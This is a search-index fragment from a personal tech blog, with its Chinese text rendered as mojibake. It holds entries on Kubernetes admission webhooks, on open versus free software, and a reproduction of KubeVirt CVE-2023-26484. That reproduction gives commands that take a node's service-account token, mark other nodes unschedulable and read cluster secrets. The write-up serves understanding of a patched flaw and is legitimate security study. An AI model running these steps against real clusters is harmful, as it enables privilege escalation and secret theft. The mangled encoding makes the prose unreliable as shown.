æ˜¯æœ€èŠ‚çœæ—¶é—´çš„æ–¹æ³•.\n","permalink":"https://dragonbox.top/posts/tech-kubernetes-webhook/","summary":"\u003ch1 id=\"deployment-and-debugging-of-admission-webhook-in-kubernetes-cluster\"\u003eDeployment and Debugging of Admission Webhook in Kubernetes cluster\u003c/h1\u003e\n\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"uhttps://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllersrl\"\u003eDynamic admission control\u003c/a\u003e å…è®¸å¼€å‘è€…æ·»åŠ è‡ªå·±çš„é€»è¾‘ä»£ç æ¥å¯¹æäº¤ç»™API Serverçš„å¯¹è±¡è¿›è¡Œä¿®æ”¹å’ŒéªŒè¯, æ˜¯éå¸¸å¼ºå¤§çš„åŠŸèƒ½. æœ¬æ–‡å°†éƒ¨ç½²ä¸€ç»„demo admission webhook, åŒ…æ‹¬ä¸€ä¸ªvalidating webhook å’Œä¸€ä¸ª mutating webhook, å¹¶ä»‹ç»webhookçš„è°ƒè¯•æ–¹æ³•. æœ¬æ–‡ä¸»è¦ä½¿ç”¨å’Œå‚è€ƒäº†\u003ca href=\"https://zhuanlan.zhihu.com/p/404764407\"\u003eä»0åˆ°1å¼€å‘K8S_Webhookæœ€ä½³å®è·µ\u003c/a\u003e, å¹¶é€šè¿‡æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¯¹å…¶ä¸­çš„ä¸€äº›ä¸é€‚åº”æ–°ç‰ˆæœ¬k8sçš„å†…å®¹è¿›è¡Œäº†ä¿®æ­£.\u003c/p\u003e\n\u003cp\u003eæœ¬æ–‡ä½¿ç”¨çš„é›†ç¾¤ç¯å¢ƒä¸ºKubernetes v1.25.16, ä½¿ç”¨minikubeåˆ›å»º. æˆ‘æ‰€åœ¨çš„æœºå™¨ä¸ºArch Linux. ä»£ç ä»“åº“ä¸º \u003ca href=\"https://github.com/scriptwang/admission-webhook-example\"\u003eadmission-webhook-example\u003c/a\u003eä¸­çš„v1éƒ¨åˆ†.\u003c/p\u003e\n\u003cp\u003eåœ¨å¼€å§‹ä¹‹å‰, è¯·ç¡®ä¿é›†ç¾¤çš„API Serverå¼€å¯äº†MutatingAdmissionWebhookå’ŒValidatingAdmissionWebhook (ä¸€èˆ¬é»˜è®¤æƒ…å†µä¸‹éƒ½å¼€å¯äº†).\u003c/p\u003e\n\u003ch2 id=\"deployment\"\u003eDeployment\u003c/h2\u003e\n\u003ch3 id=\"åˆ›å»º-service-account\"\u003eåˆ›å»º service account\u003c/h3\u003e\n\u003cp\u003eåˆ›å»ºä¸€ä¸ªç”¨äºwebhookçš„service account\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f deployment/rbac.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"åˆ›å»ºè¯ä¹¦\"\u003eåˆ›å»ºè¯ä¹¦\u003c/h3\u003e\n\u003cp\u003eAPI Serverè°ƒç”¨Webhookçš„è¿‡ç¨‹æ˜¯éœ€è¦HTTPSé€šä¿¡çš„(å…¶å®é›†ç¾¤å†…çš„é€šä¿¡å‡ ä¹éƒ½æ˜¯HTTPS), å› æ­¤éœ€è¦ä¸ºwebhookåˆ›å»ºè¯ä¹¦æ¥å¯¹webhookçš„serviceè¿›è¡ŒåŸŸåè®¤è¯. \u003cstrong\u003eåŸåšå®¢ä½¿ç”¨çš„webhook-create-signed-cert.shå·²ç»è¿‡æ—¶, ä¸å†é€‚ç”¨äº1.25.16ç‰ˆæœ¬çš„é›†ç¾¤äº†\u003c/strong\u003e, ä¸»è¦å‡ºé—®é¢˜çš„åœ°æ–¹å¦‚ä¸‹:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create  server cert/key CSR and  send to k8s API\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;EOF | kubectl create -f -\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eapiVersion: certificates.k8s.io/v1beta1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ekind: CertificateSigningRequest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  name: ${csrName}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  groups:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - system:authenticated\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  request: $(cat ${tmpdir}/server.csr | base64 | tr -d \u0026#39;\\n\u0026#39;)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  usages:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - digital signature\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - key encipherment\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - server auth\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ ¹æ®æ–‡æ¡£, åœ¨1.22ä»¥åŠä¹‹åç‰ˆæœ¬çš„kubernetesä¸­, \u003ccode\u003ecertificates.k8s.io/v1beta1\u003c/code\u003e å·²ç»è¢«æŠ›å¼ƒä¸å¯ç”¨, éœ€è¦ä¿®æ”¹ä¸º\u003ccode\u003ecertificates.k8s.io/v1\u003c/code\u003e, å¹¶ä¸”éœ€è¦åœ¨\u003ccode\u003espec\u003c/code\u003eä¸­å¢åŠ \u003ccode\u003esignerName\u003c/code\u003e, signerçš„ä½œç”¨æ˜¯ç­¾ç½²è¯ä¹¦. k8så†…ç½®çš„\u003ccode\u003esignerName\u003c/code\u003e æœ‰ä»¥ä¸‹å‡ ç§:\u003c/p\u003e","title":"Kubernetes Admission Webhook éƒ¨ç½²å’Œè°ƒè¯•"},{"content":"è¯¥æ¼æ´æ˜¯è®ºæ–‡å·¥ä½œ \u0026ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications\u0026rdquo; æŒ–æ˜åˆ°çš„, å¯¹å…¶è¿›è¡Œå¤ç°å¯ä»¥æ›´å¥½åœ°ç†è§£rbacçš„æ½œåœ¨é£é™©.\nCVE-2023-26484 Kubevirt æƒé™æå‡æ¼æ´ ç®€ä»‹ KubeVirt æ˜¯ Kubernetes çš„è™šæ‹Ÿæœºç®¡ç†æ’ä»¶. åœ¨ 0.59.0 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­, å¦‚æœæ¶æ„ç”¨æˆ·æ¥ç®¡äº†è¿è¡Œ virt-handler çš„ Kubernetes èŠ‚ç‚¹, åˆ™ virt-handler æœåŠ¡è´¦æˆ·å¯ç”¨äºä¿®æ”¹æ‰€æœ‰èŠ‚ç‚¹.è¿™å¯è¢«æ»¥ç”¨äºè¯±éª—ç³»ç»Ÿçº§ç‰¹æƒç»„ä»¶. è¿™æ ·, è¢«å…¥ä¾µçš„èŠ‚ç‚¹å°±å¯ä»¥è¢«ç”¨æ¥æå‡èŠ‚ç‚¹ä¹‹å¤–çš„æƒé™, ç›´åˆ°å¯èƒ½æ‹¥æœ‰å¯¹æ•´ä¸ªé›†ç¾¤çš„å®Œå…¨æƒé™è®¿é—®. ä¸€æ—¦ç”¨æˆ·å¯ä»¥å…¥ä¾µç‰¹å®šèŠ‚ç‚¹, æœ€ç®€å•çš„åˆ©ç”¨æ–¹æ³•å°±æ˜¯ä½¿ç”¨ virt-handler æœåŠ¡è´¦æˆ·å°†æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹è®¾ç½®ä¸ºä¸å¯è°ƒåº¦, ç„¶åç­‰å¾…å…·æœ‰é«˜æƒé™çš„ç³»ç»Ÿå…³é”®ç»„ä»¶å‡ºç°åœ¨å…¶èŠ‚ç‚¹ä¸Š.\nç¯å¢ƒæ­å»º å‚è€ƒkubevirtçš„å®˜ç½‘å®‰è£…\nexport VERSION=\u0026#34;v0.59.0\u0026#34; kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/${VERSION}/kubevirt-operator.yaml kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/${VERSION}/kubevirt-cr.yaml å¤ç° ä»ç®€ä»‹ä¸­å°±å¯ä»¥å¯¹è¿™ä¸ªæ¼æ´çš„ä½œç”¨æœºç†æœ‰ä¸€ä¸ªå¤§æ¦‚çš„äº†è§£, é‚£ä¹ˆå¤ç°çš„æ­¥éª¤å¤§è‡´åˆ†ä¸ºä»¥ä¸‹æ­¥éª¤:\nè·å–ä¸€ä¸ªèŠ‚ç‚¹çš„æƒé™, ä¸Šé¢æœ‰virt-handler, ç”±äºvirt-handleræ˜¯Daemonsetsèµ„æº, å› æ­¤ä¸€å®šå­˜åœ¨ æ‹¿åˆ°virt-handlerçš„SA Token, ç„¶åå‘API Serverå‘é€è¯·æ±‚å» patch å…¶ä»–èŠ‚ç‚¹, è®©æ–°åˆ›å»ºçš„å®¹å™¨æ— æ³•è¢«è°ƒåº¦åˆ°è¿™äº›èŠ‚ç‚¹ä¸Š åˆ é™¤å…¶ä»–èŠ‚ç‚¹ä¸Šçš„é«˜æƒé™pod, åœ¨è¿™ä¸ªæ¼æ´ä¸­, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨virt-operator pod, å®ƒçš„cluster roleå…·æœ‰list å’Œ get secretçš„æƒé™ ç­‰å¾…é«˜æƒé™podè¢«é‡æ–°åˆ›å»ºåˆ°æ”»å‡»è€…æ§åˆ¶çš„èŠ‚ç‚¹ä¸Š ä½¿ç”¨é«˜æƒé™podçš„SA, è·å–é›†ç¾¤æƒé™ ä¸ºäº†å¤ç°å®Œæ•´çš„æµç¨‹, æœ€å¼€å§‹çš„æ—¶å€™è®©virt-operatorä¸è¦å‡ºç°åœ¨è‡ªå·±çš„èŠ‚ç‚¹ä¸Š. ç”±äºæˆ‘å¤ç°ç”¨çš„é›†ç¾¤æœ‰ä¸‰ä¸ªèŠ‚ç‚¹, è€Œvirt-operatorçš„é»˜è®¤replicasæ˜¯2, å› æ­¤ä¿®æ”¹kubevirt-operator.yamlä¸­çš„ç›¸åº”é€‰é¡¹å¹¶apply, æœ€åå¾—åˆ°\nNAME READY STATUS RESTARTS AGE virt-api-695695c8bf-9jsjk 1/1 Running 1 (129m ago) 23d virt-api-695695c8bf-fljvr 1/1 Running 1 (129m ago) 23d virt-controller-6b8dbbd8c5-q7vf8 1/1 Running 1 (129m ago) 23d virt-controller-6b8dbbd8c5-x8jcb 1/1 Running 1 (129m ago) 23d virt-handler-j4qkf 1/1 Running 1 (129m ago) 23d virt-handler-ncpwp 1/1 Running 1 (129m ago) 23d virt-operator-5d5bdf9c5b-lzsmr 1/1 Running 2 (129m ago) 23d æ¥ä¸‹æ¥, ç™»å½•æ²¡æœ‰virt-operatorçš„èŠ‚ç‚¹æ¥æ¨¡æ‹Ÿæ”»å‡»è€…æ§åˆ¶è¯¥èŠ‚ç‚¹çš„åœºæ™¯. æˆ‘çš„é›†ç¾¤ä½¿ç”¨containerdä½œä¸ºå®¹å™¨å¼•æ“, æŸ¥çœ‹èŠ‚ç‚¹ä¸Šçš„å®¹å™¨\nâ¯ ctr -n k8s.io c ls CONTAINER IMAGE RUNTIME 018b6f216241def706bf49b2cbe0136d26a9440ec44fba5ff9158f9c64449f77 registry.k8s.io/pause:3.6 io.containerd.runc.v2 03bc2c88f4e7f0b748cbff9e74469886125ec7857385750dd6962547fc2c94dd registry.k8s.io/pause:3.6 io.containerd.runc.v2 2e34f1411a95334edbb18df3bfd6dd860c8369d19eb41efef66fd4aa75664ef7 registry.k8s.io/pause:3.6 io.containerd.runc.v2 3cad963e8764d3b57754dc8723e2dce8e7793c388b9a74083fd54ced88595ae3 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 3df18a38c2398324f3836bb0fbe99f55775f641559fde6a9f57247d9d13be913 quay.io/kubevirt/virt-api:v0.59.0 io.containerd.runc.v2 45a7feb9dabff6a8200ccf37f6da7c01d7f689b866127921f1b1c37d825fdeda quay.io/kubevirt/virt-handler:v0.59.0 io.containerd.runc.v2 4db25b7315ee957434ce455fd8de25c499e83ad521cb53f125fa436e5b50ad22 quay.io/kubevirt/virt-api:v0.59.0 io.containerd.runc.v2 5c26a0f3b233eadb1f46382def64ee0401b8cc19c1dda80f60ad131b1e3f821d registry.k8s.io/kube-proxy:v1.25.16 io.containerd.runc.v2 688a35b84fc0ce7bd68e02928eb4e22728559e41977a4d2a5e108f6865c5f3c6 quay.io/kubevirt/virt-controller:v0.59.0 io.containerd.runc.v2 6e6eab0c1ede3d083283f8d96758bc898a81ceb472349e04a38c3bf6042c3bfb quay.io/kubevirt/virt-controller:v0.59.0 io.containerd.runc.v2 836f05ead0f47d570373917f2315111a85104c36e2e2f700aa5949dac1963ec6 registry.k8s.io/pause:3.6 io.containerd.runc.v2 8f26e2c39123230330328ab931a517d334c83d92dad0b637c6522217cf7d9482 registry.k8s.io/pause:3.6 io.containerd.runc.v2 8f4c6b146eeea6b6f994f2deb5adc6d938ec79afb00cb71e7491b8b6e98359f6 registry.k8s.io/pause:3.6 io.containerd.runc.v2 90cc829dd1102778df74b9616dcef5061476d4a2b04660ee9ba23f34fbfdbaab quay.io/kubevirt/virt-launcher:v0.59.0 io.containerd.runc.v2 a4b93524451f68c41efa103e432622113c4909979c5d7ac538eede7455b6bfaa registry.k8s.io/kube-proxy:v1.25.16 io.containerd.runc.v2 b23ac35d5a9639ec75a923af74b9f6ed571c89a9a59ad037424fb829a39a73f1 docker.io/flannel/flannel-cni-plugin:v1.4.0-flannel1 io.containerd.runc.v2 bc71642c1b0228d2ed22e92c817d1eed581ef6179e25da5ba14b69df43251166 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 c47082251d14b8e743d41ace290bd64923b704afb9e4e9193d7ad2e6b120f176 quay.io/kubevirt/virt-handler:v0.59.0 io.containerd.runc.v2 c64079c284e3ce04c261ef192bb1a29a341f0e359dd8c0f0f5678748beaac846 registry.k8s.io/pause:3.6 io.containerd.runc.v2 ce128301b8f46a6e68711355780ff22389507e62b19ae987cbe6fdbda7fbdc58 registry.k8s.io/pause:3.6 io.containerd.runc.v2 d80cb0fc9991d5a0ba8bf565cd1ddc94273cfb50c2b56fb883f455193a1cab00 registry.k8s.io/pause:3.6 io.containerd.runc.v2 e253d834e57f7ee5ae3116e5e922aac2efda2e4475bf79de044b71666191f0c2 registry.k8s.io/pause:3.6 io.containerd.runc.v2 e983fef8d9a9556f82c81008e8efbfcd432781c48c078db6d36ef72650d0f6e4 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 ç„¶åè¦æ‰¾virt-handlerçš„sa token, åœ¨è¿™æ¬¡å¤ç°ä¸­, sa tokençš„ä½ç½®åœ¨/var/lib/kubelet/pods/3b42aafd-8696-4077-a903-6f575e7c4784/volumes/kubernetes.io~projected/kube-api-access-dc92g ä¸‹é¢, ç„¶åä½¿ç”¨è¿™ä¸ªtokenå¯¹å…¶ä»–èŠ‚ç‚¹è¿›è¡Œpatch\ncurl -k -X PATCH -H \u0026#34;Authorization: Bearer \u0026lt;sa-token\u0026gt;\u0026#34; \\ -H \u0026#34;Content-Type: application/json-patch+json\u0026#34; \\ -d \u0026#39;[{\u0026#34;op\u0026#34;: \u0026#34;replace\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/spec/unschedulable\u0026#34;, \u0026#34;value\u0026#34;: true}]\u0026#39; \\ \u0026#34;https://\u0026lt;api-server-address\u0026gt;/api/v1/nodes/\u0026lt;node\u0026gt;\u0026#34; ç„¶åæ‰‹åŠ¨åˆ é™¤virt-operator\nkubectl delete po virt-operator-5d5bdf9c5b-lzsmr ç¨ç­‰ç‰‡åˆ»å°±å¯ä»¥çœ‹åˆ°virt-operatoré‡æ–°å‡ºç°åœ¨äº†æˆ‘ä»¬æ§åˆ¶çš„èŠ‚ç‚¹ä¸Š, ä½¿ç”¨å‘½ä»¤æ¥æŸ¥çœ‹sa tokençš„å…·ä½“ä½ç½®\nctr -n k8s.io c ls ctr -n k8s.io c info \u0026lt;container-id\u0026gt; ç„¶åç”¨è¿™ä¸ªtokenå»æŸ¥çœ‹secrets, ä»¥kubevirtä¸­çš„secretsä¸ºä¾‹, å‘é€è¯·æ±‚å³å¯è¯»å–.\ncurl -k -H \u0026#34;Authorization: Bearer \u0026lt;sa-token\u0026gt;\u0026#34; https://192.168.59.101:6443/api/v1/namespaces/kubevirt/secrets ä¿®å¤ é™åˆ¶äº†operatorå¯¹secretçš„è®¿é—®èŒƒå›´, ä¿®å¤çš„commit\n","permalink":"https://dragonbox.top/posts/sec-cve-2023-26484/","summary":"\u003cp\u003eè¯¥æ¼æ´æ˜¯è®ºæ–‡å·¥ä½œ \u0026ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications\u0026rdquo; æŒ–æ˜åˆ°çš„, å¯¹å…¶è¿›è¡Œå¤ç°å¯ä»¥æ›´å¥½åœ°ç†è§£rbacçš„æ½œåœ¨é£é™©.\u003c/p\u003e","title":"CVE-2023-26484 Kubevirt æƒé™æå‡æ¼æ´å¤ç°"},{"content":"å€Ÿç€\u0026quot;è‹¥ä¸ºè‡ªç”±æ•…\u0026quot;è¿™æœ¬ä¹¦, è¯»è€…å¯ä»¥æ›´æ·±åˆ»åœ°ç†è§£å¼€æºè½¯ä»¶ä¸è‡ªç”±è½¯ä»¶çš„å¼‚åŒä¹‹å¤„. ç”±äºåœ¨å®é™…æƒ…å†µä¸­, äºŒè€…éƒ½å¼€æ”¾äº†æºä»£ç , å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¹Ÿéƒ½ä¼šé‡‡ç”¨äº’ç›¸å…¼å®¹ç”šè‡³ç›¸åŒçš„åè®®, å› æ­¤å…¶ä¸­çš„åŒºåˆ«åœ¨è¶Šæ¥è¶Šå¤šäººçœ¼é‡Œé€æ¸æ¨¡ç³Š. å¦‚ä»Šçš„è½¯ä»¶è¡Œä¸š, å¤§å¤šæ•°äººåœ¨è¡¨è¾¾ç›¸åŒæ„æ€æ—¶æ›´åŠ å€¾å‘äºä½¿ç”¨\u0026quot;Open-source\u0026quot;è€Œä¸æ˜¯\u0026quot;Free\u0026quot;è¿™ä¸ªè¯, ä¸ä»…èƒ½å¤Ÿç›´è§‚æ¸…æ™°åœ°è¡¨è¾¾ä¿¡æ¯, ä¹Ÿèƒ½é¿å…\u0026quot;Free\u0026quot;è¿™ä¸ªå•è¯å¸¸ç”¨çš„\u0026quot;å…è´¹\u0026quot;ä¹‹æ„ (ä¸ºäº†äººä»¬è®¤è¯†åˆ°\u0026quot;Free software\u0026quot;ä¸­çš„Freeä¸æ˜¯å…è´¹è€Œæ˜¯è‡ªç”±çš„æ„æ€, Stallman å¯å¼ºè°ƒäº†è®¸å¤šæ¬¡, ä½†å¾ˆé—æ†¾, å¤§éƒ¨åˆ†å…¬å¸åœ¨å¬åˆ°ä»–çš„å¼ºè°ƒå‰å°±ä¼šè¢«å“è·‘). ä½†åªè¦äº†è§£è¿‡è‡ªç”±è½¯ä»¶å’Œå¼€æºè½¯ä»¶çš„å†å², å°±èƒ½å‘ç°å…¶ä¸­å·®è·å¹¶ä¸åœ¨æŠ€æœ¯è€Œæ˜¯åœ¨é“å¾·å±‚é¢ä¸Šçš„åˆ†æ­§.\nå…·ä½“æ¥è¯´, å¼€æºè¿åŠ¨æ›´åŠ æ³¨é‡è½¯ä»¶å¼€å‘æ–¹å¼çš„å¼€æ”¾æ€§, ä¸€ç§ç±»ä¼¼äºé›†å¸‚åœºæ™¯ä¸­äººäººå¯å‚ä¸çš„, ä»¥è½¯ä»¶è´¨é‡ä¸ºæœ€ç»ˆç›®æ ‡çš„å€¡è®®, å®ƒå…³æ³¨çš„æ˜¯è½¯ä»¶æœ¬èº«, å› æ­¤é¢‡å…·å·¥ç¨‹å¸ˆçš„çº¯ç²¹ç‰¹æ€§; ç›¸å, è‡ªç”±è½¯ä»¶è¿åŠ¨ä¸ä»…ä»…æ³¨é‡è½¯ä»¶å¼€å‘æ–¹å¼, æ›´èµ‹äºˆè½¯ä»¶æœ¬èº«ä»¥é“å¾·å±æ€§, å®ƒæ›´å¼ºè°ƒè½¯ä»¶ç”¨æˆ·çš„è‡ªç”±ä¿®æ”¹å’Œè‡ªç”±ä¼ æ’­çš„æƒåˆ©, ä»¥\u0026quot;äººçš„è‡ªç”±\u0026quot;ä¸ºä¸­å¿ƒ, ä»»ä½•é™åˆ¶è½¯ä»¶ç”¨æˆ·è¿™äº›æƒåˆ©çš„ä¸ªäººå’Œç»„ç»‡éƒ½æ˜¯\u0026quot;é‚ªæ¶\u0026quot;ä¸”éœ€è¦è¢«æŠµåˆ¶çš„, è¿™è®©å®ƒæ›´åƒæ˜¯ä¸€ç§ç¤¾ä¼šè¿åŠ¨. æœ‰ä¸€å¥Stallmançš„è¯å¯ä»¥å¾ˆå¥½åœ°é˜é‡Šå…¶æ„: \u0026ldquo;å¦‚æœä¸€ä¸ªè½¯ä»¶æ˜¯ä¸è‡ªç”±çš„, å“ªæ€•å®ƒçš„æŠ€æœ¯éå¸¸å…ˆè¿›, æˆ‘ä¹Ÿä¸ä¼šå»ä½¿ç”¨å®ƒ\u0026rdquo;, ç›¸å, å¼€æºè¿åŠ¨çš„ä»£è¡¨äººç‰©Linusæ›¾ç»åœ¨ä¸€æ¬¡å¤§ä¼šä¸Šå…¬å¼€è¡¨ç¤ºè‡ªå·±æ˜¯Microsoft Powerpointçš„ç²‰ä¸ç”¨æˆ·, äºŒè€…çš„å†²çªä¹Ÿç”±æ­¤è€Œæ¥: åœ¨å¼€æºä¸»ä¹‰è€…çœ¼ä¸­, å•†ä¸šè½¯ä»¶æ˜¯ä¸€ä¸ªä¸å®Œç¾çš„è§£å†³æ–¹æ¡ˆ, ä½†æ˜¯åœ¨è‡ªç”±è½¯ä»¶è€…çœ¼ä¸­, å•†ä¸šè½¯ä»¶åˆ™æ˜¯å½»å¤´å½»å°¾çš„æ•Œäºº.\nä¸¤ç§è¿åŠ¨å¹¶ä¸æ˜¯äº’ç›¸ç‹¬ç«‹çš„, ç›¸å, å¼€æºè¿åŠ¨è„±èƒäºè‡ªç”±è½¯ä»¶è¿åŠ¨, æ˜¯åè€…ä¸ºäº†é€‚åº”è½¯ä»¶è¡Œä¸šå•†ä¸šå‘å±•çš„ä¸€ç§å¿…ç„¶æ¼”å˜, ä¹Ÿæ˜¯è¿½æ±‚è‡ªç”±çš„ç†æƒ³ä¸»ä¹‰è€…åœ¨ç°å®å±¡å±¡ç¢°å£åçš„ä¸€ç§å¦¥å.\nåœ¨ä»Šå¤©, å°½ç®¡Stallmanä¾æ—§åœ¨å…¨çƒå„åœ°å¯¹ç€ä¼—å¤šæ…•åè€Œæ¥çš„å¬ä¼—å¸ƒé“, ä»–ä¹Ÿä¾æ—§èƒ½ç»™äººä»¥éœ‡æ’¼äººå¿ƒå¼€æ‚Ÿæ˜æ™ºçš„æ„Ÿè§‰, ä½†è¿™ç§æ„Ÿè§‰è¿‡ååˆæœ‰è°ä¼šçœŸçš„å»è¿½éšä»–çš„æ­¥ä¼, å»å°†è‡ªå·±ç”Ÿæ´»ä¸­çš„æ‰€æœ‰ä¸“æœ‰è½¯ä»¶æ¸…é™¤å‘¢? è¦çŸ¥é“, Stallmançš„æ”»å‡»ç›®æ ‡, å¯ä¸ä»…ä»…æ˜¯ä¸ªäººè®¡ç®—æœºä¸­çš„ä¸“æœ‰è½¯ä»¶, ä»»ä½•éè‡ªç”±è½¯ä»¶, ä¸ç®¡æ˜¯æ±½è½¦ä¸Šçš„, é£æœºä¸Šçš„, åŠ¨è½¦ä¸Šçš„, ä¹ƒè‡³æ”¶éŸ³æœºé‡Œçš„, éƒ½æ˜¯ä»–çš„æŠµåˆ¶å¯¹è±¡. è€Œå¯¹äºæ²¡æœ‰èµ„æºçš„æ™®é€šäººæ¥è¯´, å•æ˜¯æ‰¾ä¸€å°å½»å¤´å½»å°¾æºç å¯è§(æŒ‡ä¸»æ¿ä¸Šçš„å›ºä»¶)çš„ç¬”è®°æœ¬ç”µè„‘, å°±å·²ç»æ˜¯ä¸€ä»¶éå¸¸å›°éš¾ä¸”å®Œå…¨æ²¡æœ‰æ€§ä»·æ¯”çš„äº‹æƒ…äº†.\nä»æˆ‘çš„è§’åº¦æ¥çœ‹, è™½ç„¶å¾ˆé—æ†¾, ä½†æ˜¯è‡ªå¼€æºè¿åŠ¨æˆé•¿èµ·æ¥å, è‡ªç”±è½¯ä»¶å­˜åœ¨çš„æ„ä¹‰å°±æ²¡æœ‰ä»¥å‰é‚£ä¹ˆå¤§äº†, ç”šè‡³è¯´çš„ä¸å®¢æ°”ä¸€äº›, å¾®ä¹å…¶å¾®. è¿™æ˜¯éœ€è¦è”ç³»å†å²èƒŒæ™¯æ¥çœ‹çš„, åœ¨è‡ªç”±è½¯ä»¶è¿åŠ¨è¯ç”Ÿçš„é‚£ä¸ªå¹´ä»£, è½¯ä»¶è¡Œä¸šæåº¦é—­å¡, äº’è”ç½‘æ‰åˆšåˆšè¯ç”Ÿ, å„ä¸ªå…¬å¸éƒ½åœ¨è‡ªå·±è’™å¤´é—­é—¨é€ è½¦, æå°½æ‰€èƒ½ä¿æŠ¤è‡ªå®¶çš„ä»£ç ä¸è¢«å…¬å¼€, ç›¸äº’ä¹‹é—´æ›´ä¸ç”¨è¯´æœ‰ä»€ä¹ˆå…¼å®¹åˆä½œäº†. è‡ªç”±è½¯ä»¶çš„è¯ç”Ÿæ˜¯å¯¹é‚£ä¸ªå°é—­ç¯å¢ƒçš„ä¸€ç§å½»å¤´å½»å°¾çš„åå›, å®ƒä»¥ä¸€ç§åæ¿€çš„å§¿æ€åœ¨è½¯ä»¶è¡Œä¸šé€æ¸æ‰“åŠ¨äº†ä¸€æ‰¹äºº, ä¹ŸåŸ¹å…»èµ·äº†åˆ«å…·ä¸€æ ¼æ›´åŠ å¼€æ”¾çš„æ–‡åŒ–.\nä½†æ˜¯å¾ˆé—æ†¾, è‡ªç”±ä»ä¸å±€é™äºæŸä¸€å•ä¸€é¢†åŸŸ, Stallman å’Œ fsf ä¸€ç›´ä»¥æ¥éƒ½åœ¨å¼ºè°ƒåœ¨è½¯ä»¶æ–¹é¢çš„å…¬æ°‘è‡ªç”±, ä½†å¿½è§†äº†å¯¹è¿™ç§è‡ªç”±çš„äº‰å–å¯èƒ½ä¼šå¹²æ‰°ç”šè‡³é˜»ç¢å…¬æ°‘åœ¨å…¶ä»–é¢†åŸŸçš„è‡ªç”±. ä¸¾ä¸€ä¸ªå†ç®€å•ä¸è¿‡çš„ç›´è§‚ä¾‹å­: ä¸€ä¸ªèº«æ— åˆ†æ–‡çš„è½¯ä»¶ç¨‹åºå‘˜, å‡­ä»€ä¹ˆè¦ä¸ºäº†æ‰€è°“çš„è½¯ä»¶è‡ªç”±å»æ‹’ç»è°·æ­Œçš„Offer, è¦çŸ¥é“, ä»–è¦æ”¾å¼ƒçš„, è¦ä¹ˆæ˜¯è½¯ä»¶è‡ªç”±, è¦ä¹ˆæ˜¯æ‘†è„±è´«å›°çš„è‡ªç”±, äºŒè€…å­°è½»å­°é‡, ææ€•ä¸è¨€è‡ªæ˜. è¿™æˆ–è®¸ä¹Ÿæ˜¯Stallmanå¤šå¹´ä»¥æ¥åœ¨è¿åŠ¨è¿‡ç¨‹ä¸­çš„èªæ˜æ‰€åœ¨: 